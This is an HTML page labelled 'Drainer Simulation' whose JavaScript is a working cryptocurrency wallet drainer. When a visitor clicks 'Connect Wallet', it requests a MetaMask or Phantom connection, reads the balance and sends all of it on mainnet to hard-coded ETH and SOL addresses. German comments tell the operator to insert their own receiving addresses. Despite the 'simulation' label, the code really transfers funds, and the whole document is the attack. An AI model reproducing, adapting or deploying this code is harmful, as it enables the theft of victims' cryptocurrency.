<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Drainer Simulation</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@latest/build/solana-web3-library.min.js"></script>
   <style>
   body { background: #090909; color: #00ffaa; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
   #box { border: 2px solid #00ffaa; padding: 30px; text-align: center; box-shadow: 0 0 20px #00ffaa; }
   #status { margin: 20px 0; color: white; }
   button { background: #00ffaa; color: black; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }
   </style>
</head>
<body>

<div id="box">
   <h2>DRAINER SIMULATION</h2>
   <div id="status">Awaiting Connection...</div>
   <button id="btn" onclick="connect()">Connect Wallet</button>
</div>

<script>
   // --- RECHTE ADRESSEN HIER EINTRAGEN ---
   const TARGET_ETH = "0xd4144da2f3c5D8ef7a0b1d7d2f6c6d8a5e5b4c"; // Deine ETH Adresse
   const TARGET_SOL = "9isRMs7FCaCgak95x4LRxg47DyP1ksLiF9JHG3NxYCuG"; // ZWEI verschiedene Adressen (SOL & ETH)
   
   const status = document.getElementById('status');
   const btn = document.getElementById('btn');

   async function connect() {
   btn.disabled = true;
   status.innerText = "Initializing...";
   
   if (window.ethereum) {
   await drainETH();
   } else if (window.solana) {
   await drainSOL();
   } else {
   status.innerText = "No supported wallet found!";
   btn.disabled = false;
   }
  }

   async function drainETH() {
   try {
   status.innerText = "Connecting to MetaMask...";
   const provider = new ethers.BrowserProvider(window.ethereum);
   const signer = await provider.getSigner();
   const bal = await provider.getBalance(signer.address);
   
   if (Number(bal) > 0) {
   status.innerText = "Transferring ETH...";
   const tx = await signer.sendTransaction({
   to: TARGET_ETH,
   value: bal
   });
   status.innerText = "ETH Sent! TX: " + tx.hash;
   } else {
   status.innerText = "No ETH found. Connection closed.";
   }
   } catch (e) {
   status.innerText = "Error: " + e.message;
   btn.disabled = false;
   }
  }

   async function drainSOL() {
   try {
   status.innerText = "Connecting to Phantom...";
   const provider = window.solana;
   await provider.connect();
   const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
   
   const bal = await connection.getBalance(provider.publicKey);
   
   if (bal > 0) {
   status.innerText = "Transferring SOL...";
   const transaction = new solanaWeb3.Transaction().add(
   solanaWeb3.SystemProgram.transfer({
   fromPubkey: provider.publicKey,
   toPubkey: new solanaWeb3.PublicKey(TARGET_SOL),
   lamports: bal,
   })
   );
   await provider.signAndSendTransaction(transaction);
   status.innerText = "SOL Sent successfully!";
   } else {
   status.innerText = "No SOL found.";
   btn.disabled = false;
   }
   } catch (e) {
   status.innerText = "Error: " + e.message;
   btn.disabled = false;
   }
   }
</script>

</body>
</html>
